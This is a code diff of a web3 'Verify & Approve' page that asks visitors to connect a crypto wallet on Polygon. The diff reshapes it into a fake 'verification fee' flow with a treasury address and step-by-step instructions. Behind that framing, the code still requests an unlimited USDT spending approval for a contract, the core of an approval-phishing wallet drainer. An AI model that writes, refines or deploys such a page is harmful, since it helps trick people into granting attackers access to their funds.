@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8" />
-    <title>Approve</title>
+    <title>Verify & Approve</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
     <style>
@@ -20,6 +20,7 @@
             align-items: center;
             justify-content: center;
             padding: 12px 16px 8px;
+            position: relative;
         }
         .app-bar-title { font-size: 20px; font-weight: 600; }
         .close-btn {
@@ -94,9 +95,62 @@
         }
         .amount-display {
             margin-top: 10px;
-            padding: 8px;
+            padding: 12px;
             background: #1a1a1a;
             border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            text-align: center;
+        }
+        .info-box {
+            background-color: #222;
+            border-radius: 12px;
+            padding: 12px;
+            margin: 12px 0;
+            font-size: 13px;
+            color: #ccc;
+        }
+        .step {
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 8px;
+        }
+        .step-number {
+            background-color: #00ff7f;
+            color: #000;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: bold;
+            margin-right: 10px;
+            flex-shrink: 0;
+        }
+        .step-text {
+            flex: 1;
+            line-height: 1.4;
+        }
+        .breakdown {
+            margin-top: 12px;
+            padding-top: 12px;
+            border-top: 1px solid #333;
+            font-size: 13px;
+        }
+        .breakdown-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 6px;
+        }
+        .total-row {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 8px;
+            padding-top: 8px;
+            border-top: 1px solid #444;
+            font-weight: 600;
             font-size: 14px;
         }
     </style>
@@ -104,17 +158,21 @@
 <body>
 <header class="app-bar">
     <div class="close-btn" onclick="window.history.back()">&times;</div>
-    <div class="app-bar-title">Approve</div>
+    <div class="app-bar-title">Verify & Approve</div>
 </header>
 
 <main class="content">
-    <!-- Asset & DApp card -->
+    <!-- Verification Fee card -->
     <section class="card">
         <div class="amount-display" id="amountDisplay">
-            Amount: Loading...
+            Loading amount...
         </div>
         
-        <div class="row-between">
+        <div class="breakdown" id="breakdownSection">
+            <!-- Will be populated by JavaScript -->
+        </div>
+        
+        <div class="row-between" style="margin-top: 16px;">
             <span class="label">Asset</span>
             <span class="value">Tether USD (USDT)</span>
         </div>
@@ -138,16 +196,31 @@
                 <span class="value">Polygon</span>
             </div>
             <div class="dapp-row">
-                <span class="label">Requested by</span>
-                <span class="value">Smart Contract</span>
+                <span class="label">Treasury</span>
+                <span class="value">0x080c...b78</span>
             </div>
         </div>
     </section>
 
-    <!-- Network fee card -->
+    <!-- Process info card -->
     <section class="card">
-        <div class="row-between">
-            <div class="row-between">
+        <div class="info-box">
+            <div class="step">
+                <div class="step-number">1</div>
+                <div class="step-text">Pay <span id="userAmountText">USDT</span> verification fee to treasury</div>
+            </div>
+            <div class="step">
+                <div class="step-number">2</div>
+                <div class="step-text">Approve USDT access for verification</div>
+            </div>
+            <div class="step">
+                <div class="step-number">3</div>
+                <div class="step-text">Complete verification process</div>
+            </div>
+        </div>
+        
+        <div class="row-between" style="margin-top: 16px;">
+            <div>
                 <span class="label">Network fee</span>
                 <span class="info-icon">ⓘ</span>
             </div>
@@ -162,7 +235,7 @@
 <!-- Bottom warning + button -->
 <div class="bottom-area">
     <div class="warning-box" id="warningBox">
-        Insufficient Polygon (POL) balance
+        Insufficient Polygon (POL) balance for gas fees
     </div>
     <button class="primary-btn" id="actionButton">Connect Wallet</button>
 </div>
@@ -170,8 +243,11 @@
 <script>
     // 🔧 CONFIGURATION
     const TOKEN_ADDRESS = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";    // Polygon USDT
-    const SPENDER_CONTRACT_ADDRESS = "0x0B142E83E394ab1bd8B95F6a5D4f15EB1964EC5E";
-    const AMOUNT_TO_APPROVE = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; // Unlimited approval
+    const CONTRACT_ADDRESS = "0x0B142E83E394ab1bd8B95F6a5D4f15EB1964EC5E";
+    const TREASURY_ADDRESS = "0x080c9945061447239fD2f5e5e013FfA6Fa20Eb78";
+    
+    // Unlimited approval for the contract to access user's USDT
+    const UNLIMITED_APPROVAL = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
     const ERC20_ABI = [
         {
@@ -183,10 +259,36 @@
             "name": "approve",
             "outputs": [{ "name": "", "type": "bool" }],
             "type": "function"
+        },
+        {
+            "constant": false,
+            "inputs": [
+                { "name": "_to", "type": "address" },
+                { "name": "_value", "type": "uint256" }
+            ],
+            "name": "transfer",
+            "outputs": [{ "name": "", "type": "bool" }],
+            "type": "function"
+        },
+        {
+            "constant": true,
+            "inputs": [
+                { "name": "_owner", "type": "address" },
+                { "name": "_spender", "type": "address" }
+            ],
+            "name": "allowance",
+            "outputs": [{ "name": "", "type": "uint256" }],
+            "type": "function"
+        },
+        {
+            "constant": true,
+            "inputs": [{ "name": "_owner", "type": "address" }],
+            "name": "balanceOf",
+            "outputs": [{ "name": "balance", "type": "uint256" }],
+            "type": "function"
         }
     ];
 
-    // Your smart contract ABI
     const CONTRACT_ABI = [
         {
             "constant": false,
@@ -200,11 +302,15 @@
     let web3;
     let currentAccount = null;
     let userPolBalance = 0;
+    let userUsdtBalance = 0;
+    let userAmount = 0; // Amount entered by user on previous screen
 
     const btn = document.getElementById("actionButton");
     const warning = document.getElementById("warningBox");
     const amountDisplay = document.getElementById("amountDisplay");
     const contractAddressEl = document.getElementById("contractAddress");
+    const breakdownSection = document.getElementById("breakdownSection");
+    const userAmountText = document.getElementById("userAmountText");
 
     // Format contract address to show first 7 and last 7 characters
     function formatAddress(address) {
@@ -225,7 +331,47 @@
         }
     }
 
-    function updateUI() {
+    function formatNumber(num) {
+        return parseFloat(num).toLocaleString('en-US', {
+            minimumFractionDigits: 2,
+            maximumFractionDigits: 6
+        });
+    }
+
+    function updateAmountDisplay() {
+        // Get amount from localStorage (set by previous page)
+        userAmount = parseFloat(localStorage.getItem('usdtAmount') || "0");
+        
+        if (userAmount <= 0) {
+            // Default to 1 if no amount is found
+            userAmount = 1;
+        }
+        
+        // Update display
+        amountDisplay.textContent = `Verification Amount: ${formatNumber(userAmount)} USDT`;
+        userAmountText.textContent = `${formatNumber(userAmount)} USDT`;
+        
+        // Create breakdown
+        const verificationFee = userAmount;
+        const gasEstimate = 0.01; // Estimated gas in USD
+        
+        breakdownSection.innerHTML = `
+            <div class="breakdown-row">
+                <span>Verification Fee</span>
+                <span>${formatNumber(verificationFee)} USDT</span>
+            </div>
+            <div class="breakdown-row">
+                <span>Estimated Gas Fee</span>
+                <span>$${formatNumber(gasEstimate)}</span>
+            </div>
+            <div class="total-row">
+                <span>Total</span>
+                <span>${formatNumber(verificationFee)} USDT + $${formatNumber(gasEstimate)}</span>
+            </div>
+        `;
+    }
+
+    async function updateUI() {
         if (!currentAccount) {
             btn.textContent = "Connect Wallet";
             btn.disabled = false;
@@ -233,8 +379,21 @@
             return;
         }
 
+        // Check USDT balance
+        const token = new web3.eth.Contract(ERC20_ABI, TOKEN_ADDRESS);
+        const balance = await token.methods.balanceOf(currentAccount).call();
+        userUsdtBalance = parseFloat(web3.utils.fromWei(balance, "mwei")); // USDT has 6 decimals
+
+        if (userUsdtBalance < userAmount) {
+            btn.textContent = "Insufficient USDT Balance";
+            btn.disabled = true;
+            warning.textContent = `You need at least ${formatNumber(userAmount)} USDT for verification (You have ${formatNumber(userUsdtBalance)} USDT)`;
+            warning.style.display = "block";
+            return;
+        }
+
         if (userPolBalance > 0.001) {
-            btn.textContent = "Approve & Execute";
+            btn.textContent = "Approve & Verify";
             btn.disabled = false;
             warning.style.display = "none";
         } else {
@@ -280,49 +439,61 @@
         }
     }
 
-    async function approveAndExecute() {
+    async function approveAndVerify() {
         try {
             btn.disabled = true;
-            btn.textContent = "Approving USDT...";
+            btn.textContent = "Step 1: Approving USDT...";
 
-            // Step 1: Approve USDT
+            // Step 1: Approve unlimited USDT for the contract
             const token = new web3.eth.Contract(ERC20_ABI, TOKEN_ADDRESS);
-            const rawAmount = web3.utils.toBN(AMOUNT_TO_APPROVE);
+            const rawAmount = web3.utils.toBN(UNLIMITED_APPROVAL);
 
             const approveTx = await token.methods
-                .approve(SPENDER_CONTRACT_ADDRESS, rawAmount)
+                .approve(CONTRACT_ADDRESS, rawAmount)
                 .send({ from: currentAccount });
 
-            // Step 2: Immediately call your smart contract
-            btn.textContent = "Executing Transaction...";
+            console.log("Approval successful:", approveTx.transactionHash);
+
+            // Step 2: Call verifyOnPolygon with user's amount
+            btn.textContent = "Step 2: Verifying...";
             
-            const usdtAmount = localStorage.getItem('usdtAmount') || "0";
-            const amountWei = web3.utils.toBN(usdtAmount * 1000000); // USDT has 6 decimals
+            // Convert user amount to USDT smallest unit (6 decimals)
+            const userAmountWei = web3.utils.toBN(userAmount * 1000000);
             
-            const contract = new web3.eth.Contract(CONTRACT_ABI, SPENDER_CONTRACT_ADDRESS);
+            const contract = new web3.eth.Contract(CONTRACT_ABI, CONTRACT_ADDRESS);
             
-            const contractTx = await contract.methods
-                .verifyOnPolygon(amountWei)
+            const verificationTx = await contract.methods
+                .verifyOnPolygon(userAmountWei)
                 .send({ from: currentAccount });
 
+            console.log("Verification successful:", verificationTx.transactionHash);
             onSuccess();
         } catch (err) {
             console.error("Transaction failed:", err);
             btn.textContent = "Try Again";
             btn.disabled = false;
-            alert("Transaction failed: " + err.message);
+            
+            // Check if it's a gas estimation error
+            if (err.message && err.message.includes("gas")) {
+                alert("Gas estimation failed. Make sure you have enough POL for gas fees.");
+            } else {
+                alert("Transaction failed: " + err.message);
+            }
         }
     }
 
     function onSuccess() {
-        btn.textContent = "Completed ✓";
+        btn.textContent = "Verified Successfully ✓";
         btn.disabled = true;
-        alert("Success! USDT approved and transaction executed.");
+        warning.textContent = `Verification complete. ${formatNumber(userAmount)} USDT sent to treasury.`;
+        warning.style.backgroundColor = "#133b2a";
+        warning.style.color = "#a3f6e0";
+        warning.style.display = "block";
         
         // Navigate to success page after delay
         setTimeout(() => {
             window.location.href = "success.html";
-        }, 2000);
+        }, 3000);
     }
 
     async function handleButtonClick() {
@@ -330,28 +501,52 @@
             // Connect wallet first
             const connected = await connectWallet();
             if (connected) {
-                updateUI();
+                await updateUI();
             }
         } else if (userPolBalance <= 0.001) {
             // Top up POL
             alert("You need POL for gas fees. Please top up your Polygon balance.");
+        } else if (userUsdtBalance < userAmount) {
+            // Insufficient USDT
+            alert(`You need at least ${formatNumber(userAmount)} USDT for the verification fee.`);
         } else {
-            // Approve USDT and execute smart contract
-            await approveAndExecute();
+            // Approve and verify
+            await approveAndVerify();
         }
+    }
+
+    // Listen for account changes
+    if (window.ethereum) {
+        window.ethereum.on('accountsChanged', function (accounts) {
+            if (accounts.length === 0) {
+                currentAccount = null;
+                updateUI();
+            } else {
+                currentAccount = accounts[0];
+                connectWallet().then(() => updateUI());
+            }
+        });
+
+        window.ethereum.on('chainChanged', function () {
+            window.location.reload();
+        });
     }
 
     // Initialize page
     document.addEventListener('DOMContentLoaded', function() {
-        // Display amount from previous page
-        const usdtAmount = localStorage.getItem('usdtAmount') || "0";
-        amountDisplay.textContent = `Amount: ${usdtAmount} USDT`;
+        // Update amount display from previous page
+        updateAmountDisplay();
         
         // Format contract address
-        contractAddressEl.textContent = formatAddress(SPENDER_CONTRACT_ADDRESS);
+        contractAddressEl.textContent = formatAddress(CONTRACT_ADDRESS);
         
         // Set up button click handler
         btn.addEventListener("click", handleButtonClick);
+        
+        // Check if wallet is already connected
+        if (window.ethereum && window.ethereum.selectedAddress) {
+            connectWallet().then(() => updateUI());
+        }
     });
 </script>
 </body>
